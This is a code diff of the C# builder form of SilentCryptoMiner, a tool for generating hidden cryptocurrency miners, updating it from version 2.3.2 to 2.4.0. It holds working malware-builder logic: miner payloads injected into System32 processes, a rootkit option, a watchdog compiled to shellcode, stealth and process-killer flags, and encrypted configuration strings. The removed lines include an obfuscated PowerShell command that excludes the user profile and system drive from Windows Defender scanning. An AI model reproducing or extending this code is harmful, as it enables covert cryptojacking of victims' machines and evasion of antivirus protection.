@@ -24,7 +24,7 @@ namespace SilentCryptoMiner
         public AdvancedOptions FormAO = new AdvancedOptions();
 
         public Random rand = new Random();
-        public string advancedParamsXMR = "--randomx-no-rdmsr";
+        public string advancedParamsXMR = "";
         public string advancedParamsETH = "";
         public byte[] watchdogdata = new byte[] { };
         public List<string> randomiCache = new List<string>();
@@ -59,13 +59,10 @@ namespace SilentCryptoMiner
         public string eid;
         public string xid;
 
-        public string defenderCommands;
-
-        public string builderVersion = "2.3.2";
+        public string builderVersion = "2.4.0";
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            cFormAO.Items.Add(FormAO);
             Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
             FormAS.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
             FormAO.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
@@ -82,14 +79,14 @@ namespace SilentCryptoMiner
         {
             try
             {
-                if (BuildErrorTest(listMiners.Items.Count == 0, "Error: Atleast 1 miner required to build.")) return;
-                if (BuildErrorTest(chkIcon.Checked && !File.Exists(txtIconPath.Text), "Error: Icon file could not be found.")) return;
+                if (BuildError(listMiners.Items.Count == 0, "Error: Atleast 1 miner required to build.")) return;
+                if (BuildError(chkIcon.Checked && !File.Exists(txtIconPath.Text), "Error: Icon file could not be found.")) return;
 
                 if (chkInstall.Checked)
                 {
                     foreach (var item in @"/:*?""<>|")
                     {
-                        if (BuildErrorTest(txtInstallEntryName.Text.Contains(item), "Error: Startup option \"Entry Name\" contains any of the following illegal characters: \\/:*?\"<>| ")) return;
+                        if (BuildError(txtInstallEntryName.Text.Contains(item), "Error: Startup option \"Entry Name\" contains any of the following illegal characters: \\/:*?\"<>| ")) return;
                     }
                 }
 
@@ -101,7 +98,7 @@ namespace SilentCryptoMiner
             }
             catch (Exception ex)
             {
-                BuildError("Error: An error occured while starting the build process: " + ex.Message);
+                BuildError(true, "Error: An error occured while starting the build process: " + ex.Message);
             }
         }
 
@@ -135,8 +132,6 @@ namespace SilentCryptoMiner
                 Resources_runpe = Randomi(rand.Next(5, 20));
                 Resources_parent = Randomi(rand.Next(5, 20));
 
-                defenderCommands = $"cmd /c powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{Randomi(rand.Next(2, 5), false)}#> Add-MpPreference <#{Randomi(rand.Next(2, 5), false)}#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#{Randomi(rand.Next(2, 5))}#> -Force <#{Randomi(rand.Next(2, 5))}#>"))}\"";
-
                 StringBuilder minerbuilder = new StringBuilder(Properties.Resources.Program);
 
                 List<string> minerSet = new List<string>();
@@ -146,7 +141,7 @@ namespace SilentCryptoMiner
                 BuildLog("Building miner sets...");
                 foreach (dynamic miner in listMiners.Items)
                 {
-                    if (BuildErrorTest(miner.toggleIdle.Checked && OnlyDigits(miner.txtIdleWait.Text) && int.Parse(miner.txtIdleWait.Text) < 0, $"Error: Miner {miner.nid}: Idle Wait time must be a number and not negative.")) return;
+                    if (BuildError(miner.toggleIdle.Checked && OnlyDigits(miner.txtIdleWait.Text) && int.Parse(miner.txtIdleWait.Text) < 0, $"Error: Miner {miner.nid}: Idle Wait time must be a number and not negative.")) return;
                     StringBuilder argstr = new StringBuilder();
                     bool xmr = miner.GetType() == typeof(MinerXMR);
 
@@ -167,9 +162,16 @@ namespace SilentCryptoMiner
                         argstr.Append($" --cinit-remote-config=\"{miner.txtRemoteConfig.Text}\"");
                     }
 
-                    if (miner.toggleStealth.Checked && miner.txtStealthTargets.Text.Length > 0)
+                    if (miner.toggleStealth.Checked)
                     {
-                        argstr.Append($" --cinit-stealth-targets=\"{miner.txtStealthTargets.Text}\"");
+                        if (miner.txtStealthTargets.Text.Length > 0)
+                        {
+                            argstr.Append($" --cinit-stealth-targets=\"{miner.txtStealthTargets.Text}\"");
+                        }
+                        if(miner.toggleStealthFullscreen.Checked)
+                        {
+                            argstr.Append($" --cinit-stealth-fullscreen");
+                        }
                     }
 
                     if (miner.toggleProcessKiller.Checked && miner.txtKillTargets.Text.Length > 0)
@@ -222,6 +224,8 @@ namespace SilentCryptoMiner
                             argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-gpu={Invoke(new Func<string>(() => miner.comboIdleGPU.Text.Replace("%", "")))}");
                         }
                     }
+                    argstr.Append($" --cinit-id=\"{Randomi(16)}\"");
+
                     string minerid = $"{minerFind}{(xmr ? xid : eid)}{miner.nid} ";
                     string injectionTarget = Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
                     minerSet.Add(string.Format("new string[] {{\"{0}\",\"{1}\",\"{2}\",\"{3}\"}}", EncryptString(minerid), xmr ? xid : eid, EncryptString(minerid + Unamlib_Encrypt(argstr.ToString())), EncryptString(FormAO.toggleRootkit.Checked ? "System32\\dialer.exe" : (injectionTarget != "explorer.exe" ? "System32\\" : "") + injectionTarget)));
@@ -244,7 +248,11 @@ namespace SilentCryptoMiner
                                 ObfuscationMessage("Watchdog Payload", watchdogpath + ".exe");
                             }
 
-                            if (toggleShellcode.Checked || FormAO.toggleMemoryWatchdog.Checked)
+                            if (FormAO.toggleMemoryWatchdog.Checked)
+                            {
+                                watchdogdata = Codedom.ConvertToShellcode(watchdogpath + ".exe");
+                            }
+                            else if (toggleShellcode.Checked)
                             {
                                 BuildLog("Compiling Watchdog loader...");
                                 if (Codedom.LoaderCompiler(watchdogpath + "-loader.exe", watchdogpath + ".exe", $"\"{watchdogID}\"", null, false, toggleAdministrator.Checked))
@@ -259,7 +267,7 @@ namespace SilentCryptoMiner
                                 }
                                 else
                                 {
-                                    BuildError("Error compiling Watchdog loader!");
+                                    BuildError(true, "Error compiling Watchdog loader!");
                                     return;
                                 }
                             }
@@ -272,7 +280,7 @@ namespace SilentCryptoMiner
                         }
                         else
                         {
-                            BuildError("Error compiling Watchdog payload!");
+                            BuildError(true, "Error compiling Watchdog payload!");
                             return;
                         }
                     }
@@ -288,9 +296,6 @@ namespace SilentCryptoMiner
                         ObfuscationMessage("Miner Payload", minerpath);
                     }
 
-                    string uninstallerpath = savePathBase + "-uninstaller";
-                    BuildLog("Compiling Uninstaller payload...");
-                    Codedom.UninstallerCompiler(uninstallerpath + (toggleShellcode.Checked ? "-payload.exe" : ".exe"));
                     if (toggleShellcode.Checked)
                     {
                         BuildLog("Compiling Miner loader...");
@@ -308,24 +313,13 @@ namespace SilentCryptoMiner
                         }
                         else
                         {
-                            BuildError("Error compiling Miner loader!");
+                            BuildError(true, "Error compiling Miner loader!");
                             return;
                         }
-
-                        BuildLog("Compiling Uninstaller loader...");
-                        if (Codedom.LoaderCompiler(uninstallerpath + ".exe", uninstallerpath + "-payload.exe", "\"\"", null, false, toggleAdministrator.Checked))
-                        {
-                            try
-                            {
-                                File.Delete(uninstallerpath + "-payload.exe");
-                            }
-                            catch {}
-                        }
-                        else
-                        {
-                            BuildError("Error compiling Uninstaller loader!");
-                        }
                     }
+
+                    BuildLog("Compiling Uninstaller payload...");
+                    Codedom.UninstallerCompiler(savePathBase + "-uninstaller.exe");
 
                     BuildLog("Compiling Miner Checker...");
                     Codedom.CheckerCompiler(savePathBase + "-checker.exe");
@@ -336,13 +330,13 @@ namespace SilentCryptoMiner
                 }
                 else
                 {
-                    BuildError("Error compiling Miner payload!");
+                    BuildError(true, "Error compiling Miner payload!");
                     return;
                 }
             }
             catch (Exception ex)
             {
-                BuildError("Error: An error occured while building the file: " + ex.Message);
+                BuildError(true, "Error: An error occured while building the file: " + ex.Message);
                 return;
             }
         }
@@ -354,23 +348,27 @@ namespace SilentCryptoMiner
 
         public byte[] AES_Encryptor(byte[] input)
         {
-            using (var mStream = new MemoryStream())
+            using (Aes aesAlg = Aes.Create())
             {
-                using (var cStream = new CryptoStream(mStream, new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC }.CreateEncryptor(new Rfc2898DeriveBytes(AESKEY, Encoding.ASCII.GetBytes(SALT), 100).GetBytes(16), Encoding.ASCII.GetBytes(IV)), CryptoStreamMode.Write))
+                ICryptoTransform encryptor = aesAlg.CreateEncryptor(new Rfc2898DeriveBytes(AESKEY, Encoding.ASCII.GetBytes(SALT), 100).GetBytes(16), Encoding.ASCII.GetBytes(IV));
+                using (MemoryStream msEncrypt = new MemoryStream())
                 {
-                    cStream.Write(input, 0, input.Length);
-                    cStream.Close();
+                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                    {
+                        csEncrypt.Write(input, 0, input.Length);
+                        csEncrypt.Close();
+                    }
+                    return msEncrypt.ToArray();
                 }
-                return mStream.ToArray();
             }
         }
 
         public string EncryptString(string input)
         {
-            return Convert.ToBase64String(AES_Encryptor(Encoding.UTF8.GetBytes(input)));
+            return Convert.ToBase64String(AES_Encryptor(Encoding.Unicode.GetBytes(input)));
         }
 
-        public bool BuildErrorTest(bool condition, string message)
+        public bool BuildError(bool condition, string message)
         {
             if (condition)
             {
@@ -387,31 +385,12 @@ namespace SilentCryptoMiner
             Invoke(new Action(() => txtLog.Text += message + Environment.NewLine));
         }
 
-        public void BuildError(string message)
-        {
-            BuildLog(message);
-            Invoke(new Action(() => btnBuild.Text = "Build"));
-            Invoke(new Action(() => btnBuild.Enabled = true));
-        }
-
         public void ObfuscationMessage(string name, string path)
         {
             MessageBox.Show($"The {name} has been compiled and can be found in the same folder as the selected miner build path ({path}). Press OK after you're done with obfuscating and replacing the {name}.");
         }
 
-        public string RandomString(int length)
-        {
-            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789!$&()*+,-./:<=>@[]^_";
-            const int clength = 55;
-            var buffer = new char[length];
-            for (var i = 0; i < length; ++i)
-            {
-                buffer[i] = chars[rand.Next(clength)];
-            }
-            return new string(buffer);
-        }
-
-        public string Randomi(int length, bool addToCache = true)
+        public string Randomi(int length, bool useCache = true)
         {
             while (true)
             {
@@ -423,12 +402,16 @@ namespace SilentCryptoMiner
                     sb.Append(Chr.Substring(idx, 1));
                 }
 
-                if (!randomiCache.Contains(sb.ToString()))
+                if (useCache)
                 {
-                    if (addToCache)
+                    if (!randomiCache.Contains(sb.ToString()))
                     {
-                        randomiCache.Add(sb.ToString());
+                        randomiCache.Add(sb.ToString());                   
+                        return sb.ToString();
                     }
+                }
+                else
+                {
                     return sb.ToString();
                 }
             }
@@ -631,11 +614,6 @@ namespace SilentCryptoMiner
             Process.Start("https://github.com/UnamSanctam/SilentCryptoMiner");
         }
 
-        private void labelHackforums_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        {
-            Process.Start("https://hackforums.net/showthread.php?tid=5995773");
-        }
-
         private void labelWiki_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
             Process.Start("https://github.com/UnamSanctam/SilentCryptoMiner/wiki");
@@ -675,6 +653,7 @@ namespace SilentCryptoMiner
             for (int i = 0; i < count; i++)
             {
                 ((dynamic)listMiners.Items[i]).nid = i;
+                ((dynamic)listMiners.Items[i]).F = this;
                 listMiners.Items[i] = listMiners.Items[i];
             }
         }
@@ -684,7 +663,7 @@ namespace SilentCryptoMiner
             string savepath = SaveDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
             if (!string.IsNullOrEmpty(savepath))
             {
-                FormSerializer.Serialise(this, savepath);
+                FormSerializer.Serialise(new List<Control>() { this, FormAO }, savepath);
             }
         }
 
@@ -695,8 +674,7 @@ namespace SilentCryptoMiner
             {
                 try
                 {
-                    FormSerializer.Deserialise(this, loadpath);
-                    FormAO = (AdvancedOptions)cFormAO.Items[0];
+                    FormSerializer.Deserialise(new List<Control>() { this, FormAO }, loadpath);
                     ReloadMinerList();
                     try
                     {
@@ -708,7 +686,7 @@ namespace SilentCryptoMiner
                     catch { }
                 } 
                 catch {
-                    MessageBox.Show("Could not parse the configuration file..", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    MessageBox.Show("Could not parse the configuration file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
             }
         }
